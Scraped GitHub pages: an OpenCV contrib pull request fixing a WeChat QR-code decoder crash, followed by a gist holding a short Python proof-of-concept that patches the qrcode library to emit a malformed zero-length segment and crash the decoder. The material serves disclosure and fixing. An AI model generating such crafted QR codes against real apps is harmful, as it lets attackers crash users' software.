[![@GZTimeWalker](https://avatars.githubusercontent.com/u/28180262?s=80&u=2f3a3d19db6fe622986b08ed5951f74125f15bae&v=4)](/GZTimeWalker)

Copy link

Contributor

### **[GZTimeWalker](/GZTimeWalker)** commented [Apr 25, 2023](#issuecomment-1521246154) • edited Loading

| [@WanliZhong](https://github.com/WanliZhong) All changes are applied, and we updated the branch <https://github.com/Konano/opencv_extra/tree/patch-1>  The [error](https://pullrequest.opencv.org/buildbot/builders/precommit-contrib_windows64/builds/100167/steps/test_wechat_qrcode) on windows x64 are caused by the wrong environment variables, we tested the code localy, it works fine.  [image](https://user-images.githubusercontent.com/28180262/234200599-849e44e2-bd81-4eda-beb9-a80428708960.png) |
| --- |

 👍
3
 zihaomu, WanliZhong, and MichaelHuyp reacted with thumbs up emoji

All reactions

* 👍
  3 reactions

Sorry, something went wrong.

[![@WanliZhong](https://avatars.githubusercontent.com/u/49567307?s=80&u=ba4399406177f757b46887f9bebc75e32e70a80f&v=4)](/WanliZhong)

Copy link

Member

### **[WanliZhong](/WanliZhong)** commented [Apr 25, 2023](#issuecomment-1521249016) • edited Loading

| Good! Let's check if the test can be passed on all platform |
| --- |

All reactions

Sorry, something went wrong.

[![@Henryk07](https://avatars.githubusercontent.com/u/45092460?s=80&u=7408ee089d9c8cd2efae43191a70881368bb27f8&v=4)](/Henryk07)

Copy link

### **[Henryk07](/Henryk07)** commented [Apr 25, 2023](#issuecomment-1521275275)

| so fast!! 厉害！ |
| --- |

All reactions

Sorry, something went wrong.

[![aisk](https://avatars.githubusercontent.com/u/699636?s=60&v=4)](/aisk)

**[aisk](/aisk)**
reviewed
[Apr 25, 2023](#pullrequestreview-1399290886)

 [View reviewed changes](/opencv/opencv_contrib/pull/3480/files/2c7ecf3ed844e7ad7ca2788ae20c16a660dd3629)

[modules/wechat\_qrcode/src/zxing/qrcode/decoder/decoded\_bit\_stream\_parser.cpp](/opencv/opencv_contrib/pull/3480/files/2c7ecf3ed844e7ad7ca2788ae20c16a660dd3629#diff-ad3ee3d27a32dc06f0cc75bafebe68e51cb918044e7afdd6f905a52c0757c747)

Show resolved

Hide resolved

[![zihaomu](https://avatars.githubusercontent.com/u/16487352?s=60&v=4)](/zihaomu)

**[zihaomu](/zihaomu)**
approved these changes
[Apr 25, 2023](#pullrequestreview-1399349883)

 [View reviewed changes](/opencv/opencv_contrib/pull/3480/files/2c7ecf3ed844e7ad7ca2788ae20c16a660dd3629)

Copy link

Member

### @zihaomu **[zihaomu](/zihaomu)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Thanks for your contribution! 👍

Sorry, something went wrong.

All reactions

[![@zihaomu](https://avatars.githubusercontent.com/u/16487352?s=80&u=7db3273394f4d449cba5caf9026cefbacc7f1d4b&v=4)](/zihaomu)

Copy link

Member

### **[zihaomu](/zihaomu)** commented [Apr 25, 2023](#issuecomment-1521342710) • edited Loading

| Please take a look. [@asmorkalov](https://github.com/asmorkalov), [@opencv-alalek](https://github.com/opencv-alalek), [@vpisarev](https://github.com/vpisarev). This error only occurs in `wechat_qrcode`, but not in the `qrcode` of `opencv/opencv`. |
| --- |

All reactions

Sorry, something went wrong.

[![@WanliZhong](https://avatars.githubusercontent.com/u/49567307?s=80&u=ba4399406177f757b46887f9bebc75e32e70a80f&v=4)](/WanliZhong)

Copy link

Member

### **[WanliZhong](/WanliZhong)** commented [Apr 25, 2023](#issuecomment-1521362973) • edited Loading

| There is a slight difference between `qrcode` and `wechat_qrcode`. `qrcode` module will return an empty string, since the qrcode is considered to be wrong case. But `wechat_qrcode` will ignore the error and return "KFCVW50 " |
| --- |

All reactions

Sorry, something went wrong.

[![@GZTimeWalker](https://avatars.githubusercontent.com/u/28180262?s=80&u=2f3a3d19db6fe622986b08ed5951f74125f15bae&v=4)](/GZTimeWalker)

Copy link

Contributor

### **[GZTimeWalker](/GZTimeWalker)** commented [Apr 25, 2023](#issuecomment-1521371860)

| There is a slight difference between `qrcode` and `wechat_qrcode`. `qrcode` module will return an empty string, since the qrcode is considered to be wrong case. But `wechat_qrcode` will ignore the error and return "KFCVW50 "  From my point of view, since the data in the mixed mode of the QRCode is parsed from many segments, a decoder should have to output as many partially correct results as possible. |
| --- |

All reactions

Sorry, something went wrong.

[![fengyuentau](https://avatars.githubusercontent.com/u/17219438?s=60&v=4)](/fengyuentau)

**[fengyuentau](/fengyuentau)**
reviewed
[Apr 25, 2023](#pullrequestreview-1399385623)

 [View reviewed changes](/opencv/opencv_contrib/pull/3480/files/2c7ecf3ed844e7ad7ca2788ae20c16a660dd3629)

[modules/wechat\_qrcode/src/zxing/qrcode/decoder/decoded\_bit\_stream\_parser.cpp](/opencv/opencv_contrib/pull/3480/files/2c7ecf3ed844e7ad7ca2788ae20c16a660dd3629#diff-ad3ee3d27a32dc06f0cc75bafebe68e51cb918044e7afdd6f905a52c0757c747)

Comment on lines
+201
 to
+206

|  |  | size\_t nBytes = count; |
| --- | --- | --- |
|  |  |  |
|  |  | ArrayRef<char> bytes\_(nBytes); |
|  |  | // issue https://github.com/opencv/opencv\_contrib/issues/3478 |
|  |  | if (bytes\_->empty()) |
|  |  | return; |

Copy link

Member

### @fengyuentau **[fengyuentau](/fengyuentau)** [Apr 25, 2023](#discussion_r1176174474)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

If I understand correctly, `bytes_->empty()` should be equivalent to `nBytes == 0`. So why not using `nBytes == 0` for simplicity and efficiency?

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @Konano **[Konano](/Konano)** [Apr 25, 2023](#discussion_r1176179655)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

I think this change would be a more visual indication of the intention to avoid null pointers?

Sorry, something went wrong.

All reactions

Copy link

Member

### @zihaomu **[zihaomu](/zihaomu)** [Apr 25, 2023](#discussion_r1176229298)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

yes

Sorry, something went wrong.

All reactions

[![@Konano](https://avatars.githubusercontent.com/u/22500116?s=80&u=e3d4a5f3e3fa026b0276cb58328fbd117ce35d19&v=4)](/Konano)

Copy link

Contributor

Author

### **[Konano](/Konano)** commented [Apr 25, 2023](#issuecomment-1521400594) • edited Loading

| 🎉 All test cases on all platform have been passed! |
| --- |

 🎉
5
 GZTimeWalker, lizy14, MichaelHuyp, Lakr233, and arrowrowe reacted with hooray emoji

All reactions

* 🎉
  5 reactions

Sorry, something went wrong.

[![@view6view](https://avatars.githubusercontent.com/u/77600740?s=80&u=17539110c3c5b715504789fa89d1e4222c0e7304&v=4)](/view6view)

Copy link

### **[view6view](/view6view)** commented [Apr 25, 2023](#issuecomment-1521411988)

| tql，大佬 |
| --- |

All reactions

Sorry, something went wrong.

[![@hanxu317317](https://avatars.githubusercontent.com/u/8518989?s=80&u=8a0e7cbb1fc1604c695415cd4c2602e5f5a857ee&v=4)](/hanxu317317)

Copy link

### **[hanxu317317](/hanxu317317)** commented [Apr 25, 2023](#issuecomment-1521447189)

| 昨天刚发现. 今天就修复~够速度 . |
| --- |

All reactions

Sorry, something went wrong.

[![@7a3lv7](https://avatars.githubusercontent.com/u/11425464?s=80&u=25e5fb5ec7f0ddf42ed4200008ae7a89386ada44&v=4)](/7a3lv7)

Copy link

### **[7a3lv7](/7a3lv7)** commented [Apr 26, 2023](#issuecomment-1522696118)

| Amazing |
| --- |

All reactions

Sorry, something went wrong.

[![@Konano](https://avatars.githubusercontent.com/u/22500116?s=80&u=e3d4a5f3e3fa026b0276cb58328fbd117ce35d19&v=4)](/Konano)

Copy link

Contributor

Author

### **[Konano](/Konano)** commented [Apr 26, 2023](#issuecomment-1522875281)

| It seems that everything is done. Can you please review and merge? [@alalek](https://github.com/alalek). |
| --- |

All reactions

Sorry, something went wrong.

[![@zihaomu](https://avatars.githubusercontent.com/u/16487352?s=40&u=7db3273394f4d449cba5caf9026cefbacc7f1d4b&v=4)](/zihaomu)
[zihaomu](/zihaomu)
added
the
[test](/opencv/opencv_contrib/labels/test)
label
[Apr 26, 2023](#event-9099786238)

 [![@vpisarev](https://avatars.githubusercontent.com/u/2110786?s=40&u=c2e6d7949ad8d5b897066d660e2c403a88c4c59e&v=4)](/vpisarev)
[vpisarev](/vpisarev)
self-requested a review
[April 26, 2023 07:08](#event-9099789755)

[![vpisarev](https://avatars.githubusercontent.com/u/2110786?s=60&v=4)](/vpisarev)

**[vpisarev](/vpisarev)**
approved these changes
[Apr 26, 2023](#pullrequestreview-1401303135)

 [View reviewed changes](/opencv/opencv_contrib/pull/3480/files/2c7ecf3ed844e7ad7ca2788ae20c16a660dd3629)

[![@vpisarev](https://avatars.githubusercontent.com/u/2110786?s=40&u=c2e6d7949ad8d5b897066d660e2c403a88c4c59e&v=4)](/vpisarev)
[vpisarev](/vpisarev)
merged commit [`ccc2772`](/opencv/opencv_contrib/commit/ccc277247ac1a7aef0a90353edcdec35fbc5903c)
into
opencv:4.x

[Apr 26, 2023](https://github.com/opencv/opencv_contrib/pull/3480#event-9099798061)

[![@hcqbuqingzhen](https://avatars.githubusercontent.com/u/49399978?s=80&u=73cb57de2d02f89c17ed2026fa781e5ffe2b07dd&v=4)](/hcqbuqingzhen)

Copy link

### **[hcqbuqingzhen](/hcqbuqingzhen)** commented [Apr 26, 2023](#issuecomment-1522923245)

| NIU 大佬 |
| --- |

All reactions

Sorry, something went wrong.

[![@karzeoy](https://avatars.githubusercontent.com/u/12065517?s=80&u=cb8575a6d45217d6f9cbe7752ee8671b6e4c7061&v=4)](/karzeoy)

Copy link

### **[karzeoy](/karzeoy)** commented [Apr 26, 2023](#issuecomment-1522984441)

| amazing！ |
| --- |

All reactions

Sorry, something went wrong.

[![@Takeoff0518](https://avatars.githubusercontent.com/u/64719447?s=80&u=a11d34ded1d7d343849c501a157791644acf2090&v=4)](/Takeoff0518)

Copy link

### **[Takeoff0518](/Takeoff0518)** commented [Apr 26, 2023](#issuecomment-1523004956)

| OrzOrzOrzOrz |
| --- |

All reactions

Sorry, something went wrong.

[![@Konano](https://avatars.githubusercontent.com/u/22500116?s=80&u=e3d4a5f3e3fa026b0276cb58328fbd117ce35d19&v=4)](/Konano)

Copy link

Contributor

Author

### **[Konano](/Konano)** commented [Apr 26, 2023](#issuecomment-1523012439)

| This pr has too much attention on the internet and has been merged, maybe we should lock it to avoid too many pointless comments. [@WanliZhong](https://github.com/WanliZhong) [@zihaomu](https://github.com/zihaomu) |
| --- |

All reactions

Sorry, something went wrong.

[![@opencv](https://avatars.githubusercontent.com/u/5009934?s=40&v=4)](/opencv)
[opencv](/opencv)
locked as **resolved** and limited conversation to collaborators
[Apr 26, 2023](#event-9100641509)

[Sign up for free](/join?source=comment-repo)
**to subscribe to this conversation on GitHub**.
Already have an account?
[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopencv%2Fopencv_contrib%2Fpull%2F3480).

Reviewers

[![@WanliZhong](https://avatars.githubusercontent.com/u/49567307?s=40&v=4)](/WanliZhong) [WanliZhong](/WanliZhong)

WanliZhong left review comments

[![@fengyuentau](https://avatars.githubusercontent.com/u/17219438?s=40&v=4)](/fengyuentau) [fengyuentau](/fengyuentau)

fengyuentau left review comments

[![@zihaomu](https://avatars.githubusercontent.com/u/16487352?s=40&v=4)](/zihaomu) [zihaomu](/zihaomu)

zihaomu approved these changes

[![@aisk](https://avatars.githubusercontent.com/u/699636?s=40&v=4)](/aisk) [aisk](/aisk)

aisk approved these changes

[![@mochaaP](https://avatars.githubusercontent.com/u/21154023?s=40&v=4)](/mochaaP) [mochaaP](/mochaaP)

mochaaP approved these changes

[![@vpisarev](https://avatars.githubusercontent.com/u/2110786?s=40&v=4)](/vpisarev) [vpisarev](/vpisarev)

vpisarev approved these changes

Assignees

No one assigned

Labels

[bug](/opencv/opencv_contrib/labels/bug)
[category: wechat\_qrcode](/opencv/opencv_contrib/labels/category%3A%20wechat_qrcode)
[test](/opencv/opencv_contrib/labels/test)

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

 [接入微信二维码识别引擎后 这个二维码会crash 微信线上包也一样](https://github.com/opencv/opencv_contrib/issues/3478)

48 participants

[![@Konano](https://avatars.githubusercontent.com/u/22500116?s=52&v=4)](/Konano) [![@ssst0n3](https://avatars.githubusercontent.com/u/16935049?s=52&v=4)](/ssst0n3) [![@k3lpi3b4nsh33](https://avatars.githubusercontent.com/u/118002757?s=52&v=4)](/k3lpi3b4nsh33) [![@TUGOhost](https://avatars.githubusercontent.com/u/28786059?s=52&v=4)](/TUGOhost) [![@syuy](https://avatars.githubusercontent.com/u/34786338?s=52&v=4)](/syuy) [![@Lakr233](https://avatars.githubusercontent.com/u/25259084?s=52&v=4)](/Lakr233) [![@helin0815](https://avatars.githubusercontent.com/u/53761824?s=52&v=4)](/helin0815) [![@KarKLi](https://avatars.githubusercontent.com/u/34907015?s=52&v=4)](/KarKLi) [![@KongWeibin](https://avatars.githubusercontent.com/u/8340941?s=52&v=4)](/KongWeibin) [![@Timon-2022](https://avatars.githubusercontent.com/u/105454512?s=52&v=4)](/Timon-2022) [![@Naville](https://avatars.githubusercontent.com/u/5205699?s=52&v=4)](/Naville) [![@yilongli-tubi](https://avatars.githubusercontent.com/u/124650028?s=52&v=4)](/yilongli-tubi) [![@yoghurt-lee](https://avatars.githubusercontent.com/u/22719919?s=52&v=4)](/yoghurt-lee) [![@Nagico](https://avatars.githubusercontent.com/u/25633151?s=52&v=4)](/Nagico) [![@DapengFeng](https://avatars.githubusercontent.com/u/18318646?s=52&v=4)](/DapengFeng) [![@sfc9982](https://avatars.githubusercontent.com/u/26681591?s=52&v=4)](/sfc9982) [![@UPON-2021](https://avatars.githubusercontent.com/u/93699115?s=52&v=4)](/UPON-2021) [![@Apple-QAQ](https://avatars.githubusercontent.com/u/88485487?s=52&v=4)](/Apple-QAQ) [![@xieyumc](https://avatars.githubusercontent.com/u/47858007?s=52&v=4)](/xieyumc) [![@NoahZhang1](https://avatars.githubusercontent.com/u/41597923?s=52&v=4)](/NoahZhang1) [![@HRan2004](https://avatars.githubusercontent.com/u/42177278?s=52&v=4)](/HRan2004) [![@RJHD-GIT](https://avatars.githubusercontent.com/u/58375039?s=52&v=4)](/RJHD-GIT) [![@lizhongyuan3](https://avatars.githubusercontent.com/u/44236581?s=52&v=4)](/lizhongyuan3) [![@Tencnet777](https://avatars.githubusercontent.com/u/75507823?s=52&v=4)](/Tencnet777) [![@playerhch](https://avatars.githubusercontent.com/u/90513851?s=52&v=4)](/playerhch) [![@AlanDecode](https://avatars.githubusercontent.com/u/28399641?s=52&v=4)](/AlanDecode) [![@xiaou61](https://avatars.githubusercontent.com/u/113765024?s=52&v=4)](/xiaou61) [![@chen6833](https://avatars.githubusercontent.com/u/121285531?s=52&v=4)](/chen6833) [![@WanliZhong](https://avatars.githubusercontent.com/u/49567307?s=52&v=4)](/WanliZhong) [![@yunlong826](https://avatars.githubusercontent.com/u/54716133?s=52&v=4)](/yunlong826) [![@dddzg](https://avatars.githubusercontent.com/u/15963514?s=52&v=4)](/dddzg) [![@location-txl](https://avatars.githubusercontent.com/u/38071512?s=52&v=4)](/location-txl) [![@local-h0st](https://avatars.githubusercontent.com/u/98169420?s=52&v=4)](/local-h0st) [![@zihaomu](https://avatars.githubusercontent.com/u/16487352?s=52&v=4)](/zihaomu) [![@GZTimeWalker](https://avatars.githubusercontent.com/u/28180262?s=52&v=4)](/GZTimeWalker) [![@JulianSong](https://avatars.githubusercontent.com/u/2277048?s=52&v=4)](/JulianSong) [![@Henryk07](https://avatars.githubusercontent.com/u/45092460?s=52&v=4)](/Henryk07) [![@view6view](https://avatars.githubusercontent.com/u/77600740?s=52&v=4)](/view6view) [![@hanxu317317](https://avatars.githubusercontent.com/u/8518989?s=52&v=4)](/hanxu317317) [![@7a3lv7](https://avatars.githubusercontent.com/u/11425464?s=52&v=4)](/7a3lv7) [![@hcqbuqingzhen](https://avatars.githubusercontent.com/u/49399978?s=52&v=4)](/hcqbuqingzhen) [![@karzeoy](https://avatars.githubusercontent.com/u/12065517?s=52&v=4)](/karzeoy) [![@Takeoff0518](https://avatars.githubusercontent.com/u/64719447?s=52&v=4)](/Takeoff0518) [![@aisk](https://avatars.githubusercontent.com/u/699636?s=52&v=4)](/aisk) [![@vpisarev](https://avatars.githubusercontent.com/u/2110786?s=52&v=4)](/vpisarev) [![@fengyuentau](https://avatars.githubusercontent.com/u/17219438?s=52&v=4)](/fengyuentau) [![@mochaaP](https://avatars.githubusercontent.com/u/21154023?s=52&v=4)](/mochaaP) [![@opencv-alalek](https://avatars.githubusercontent.com/u/128253464?s=52&v=4)](/opencv-alalek)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from gist.github.com_d0d55cc9_20250115_092832.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FGZTimeWalker%2F3ca70a8af2f5830711e9cccc73fb5270)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FGZTimeWalker%2F3ca70a8af2f5830711e9cccc73fb5270&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FGZTimeWalker%2F3ca70a8af2f5830711e9cccc73fb5270) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FGZTimeWalker%2F3ca70a8af2f5830711e9cccc73fb5270&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@GZTimeWalker](https://avatars.githubusercontent.com/u/28180262?s=64&v=4)](/GZTimeWalker)

# [GZTimeWalker](/GZTimeWalker)/**[qrcode\_crash\_wechat.py](/GZTimeWalker/3ca70a8af2f5830711e9cccc73fb5270)**

Created
April 23, 2023 19:25

Show Gist options

* [Download ZIP](/GZTimeWalker/3ca70a8af2f5830711e9cccc73fb5270/archive/dd3a9835e1bee39d548725219c9d25a596cf1ea6.zip)

* [Star
  (31)
  31](/login?return_to=https%3A%2F%2Fgist.github.com%2FGZTimeWalker%2F3ca70a8af2f5830711e9cccc73fb5270)You must be signed in to star a gist
* [Fork
  (3)
  3](/login?return_to=https%3A%2F%2Fgist.github.com%2FGZTimeWalker%2F3ca70a8af2f5830711e9cccc73fb5270)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/GZTimeWalker/3ca70a8af2f5830711e9cccc73fb5270.js&quot;&gt;&lt;/script&gt;
* Save GZTimeWalker/3ca70a8af2f5830711e9cccc73fb5270 to your computer and use it in GitHub Desktop.

[Code](/GZTimeWalker/3ca70a8af2f5830711e9cccc73fb5270)
[Revisions
1](/GZTimeWalker/3ca70a8af2f5830711e9cccc73fb5270/revisions)
[Stars
31](/GZTimeWalker/3ca70a8af2f5830711e9cccc73fb5270/stargazers)
[Forks
3](/GZTimeWalker/3ca70a8af2f5830711e9cccc73fb5270/forks)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/GZTimeWalker/3ca70a8af2f5830711e9cccc73fb5270.js&quot;&gt;&lt;/script&gt;

Save GZTimeWalker/3ca70a8af2f5830711e9cccc73fb5270 to your computer and use it in GitHub Desktop.

[Download ZIP](/GZTimeWalker/3ca70a8af2f5830711e9cccc73fb5270/archive/dd3a9835e1bee39d548725219c9d25a596cf1ea6.zip)

 [Raw](/GZTimeWalker/3ca70a8af2f5830711e9cccc73fb5270/raw/dd3a9835e1bee39d548725219c9d25a596cf1ea6/qrcode_crash_wechat.py)

[**qrcode\_crash\_wechat.py**](#file-qrcode_crash_wechat-py)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | import qrcode |
| --- | --- |
|  | from qrcode.util import \* |
|  |  |
|  | def hack\_put(self, num, length): |
|  | if num == 0: |
|  | num = 233 # make a fake length |
|  | for i in range(length): |
|  | self.put\_bit(((num >> (length - i - 1)) & 1) == 1) |
|  |  |
|  | qrcode.util.BitBuffer.put = hack\_put |
|  |  |
|  | qr = qrcode.QRCode(2, qrcode.constants.ERROR\_CORRECT\_M, mask\_pattern=0) |
|  |  |
|  | num\_data = QRData('1145141', MODE\_NUMBER) |
|  | data = QRData(b'.', MODE\_8BIT\_BYTE) |
|  | hack\_data = QRData(b'', MODE\_8BIT\_BYTE) |
|  |  |
|  | # make sure all data is fit to the max content length for this version |
|  | qr.add\_data(num\_data) |
|  | qr.add\_data(data) |
|  | qr.add\_data(num\_data) |
|  | qr.add\_data(data) |
|  | qr.add\_data(num\_data) |
|  | qr.add\_data(data) |
|  | qr.add\_data(num\_data) |
|  | # add a zero length data to make the length of the data to be 233 |
|  | qr.add\_data(hack\_data) |
|  |  |
|  | qr.make\_image() |

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FGZTimeWalker%2F3ca70a8af2f5830711e9cccc73fb5270)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


